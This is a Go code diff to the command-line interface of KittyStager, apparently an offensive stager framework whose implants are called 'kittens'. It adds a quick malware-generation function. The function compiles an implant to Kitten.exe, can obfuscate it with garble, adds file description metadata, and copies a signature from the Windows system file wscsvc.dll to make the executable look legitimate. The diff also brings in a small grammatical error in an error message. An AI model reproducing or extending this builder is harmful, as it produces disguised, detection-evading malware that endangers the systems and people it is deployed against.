@@ -2,13 +2,16 @@ package cli
 
 import (
 	"KittyStager/cmd/config"
+	"KittyStager/cmd/generate"
 	"KittyStager/cmd/http"
 	"KittyStager/cmd/util"
 	"fmt"
 	i "github.com/JoaoDanielRufino/go-input-autocomplete"
+	"github.com/briandowns/spinner"
 	color "github.com/logrusorgru/aurora"
 	"strconv"
 	"strings"
+	"time"
 )
 
 // payload chose the payload to use
@@ -97,7 +100,7 @@ func interact() {
 		return
 	}
 	if !http.Targets[kittenName].GetAlive() {
-		util.ErrPrint(fmt.Errorf("this kitten is dead"))
+		util.ErrPrint(fmt.Errorf("this kittens is dead"))
 		return
 	}
 	fmt.Println()
@@ -164,4 +167,89 @@ func printConfig(conf config.General) {
 		fmt.Printf("%s\t%s\n", color.Green("Malware path:"), color.Yellow(v))
 	}
 	fmt.Println()
+}
+
+func genMalwareQuick() error {
+	var compiler string
+	outputPath := "./output/Kitten.exe"
+	fmt.Println(color.Yellow(outputPath))
+	fmt.Println("Generating a new kittens")
+	kittenList, err := generate.NewKittenList()
+	names := kittenList.GetKittenNames()
+	if err != nil {
+		return err
+	}
+
+	fmt.Printf("%s\n%s\n", color.Yellow("0 : go"), color.Yellow("1 : garble"))
+	fmt.Printf("\n%s\n", color.Yellow("[!] Please chose the compiler"))
+	id, err := i.Read("id: ")
+	if err != nil {
+		return err
+	}
+	s, err := strconv.Atoi(id)
+	if s != 0 && s != 1 {
+		return fmt.Errorf("invalid input")
+	}
+	if s == 0 {
+		compiler = "go"
+	} else {
+		compiler = "garble"
+	}
+	fmt.Println()
+	printKittens(names)
+	//select a kitten
+	fmt.Printf("\n%s\n", color.Yellow("[!] Please enter the id of the kitten to generate"))
+	id, err = i.Read("id: ")
+	if err != nil {
+		return err
+	}
+	s, err = strconv.Atoi(id)
+	if err != nil {
+		return fmt.Errorf("invalid choice")
+	}
+	path, err := kittenList.GetKittensPath(names[s])
+	if err != nil {
+		return err
+	}
+	spin := spinner.New(spinner.CharSets[23], 100*time.Millisecond)
+	spin.Start()
+
+	err, out1 := generate.Description(outputPath)
+	if err != nil {
+		spin.Stop()
+		return err
+	}
+	var out2 string
+	if compiler == "go" {
+		err, out2 = generate.GoBuild(outputPath, path)
+		if err != nil {
+			spin.Stop()
+			return err
+		}
+	} else {
+		err, out2 = generate.GarbleBuild(outputPath, path)
+		if err != nil {
+			spin.Stop()
+			return err
+		}
+	}
+	signedBinary := "C:\\Windows\\System32\\wscsvc.dll"
+
+	err, out3 := generate.Signe(signedBinary, outputPath)
+	if err != nil {
+		spin.Stop()
+		return err
+	}
+	spin.Stop()
+	fmt.Println(color.Green(out1))
+	fmt.Println(color.Green(out2))
+	fmt.Println(color.Green(out3))
+	return error(nil)
+}
+
+func printKittens(names []string) {
+	fmt.Printf("%s\n", color.Green("Kitten names:"))
+	for id, v := range names {
+		fmt.Printf("%d : %s\n", color.Yellow(id), color.Yellow(v))
+	}
 }
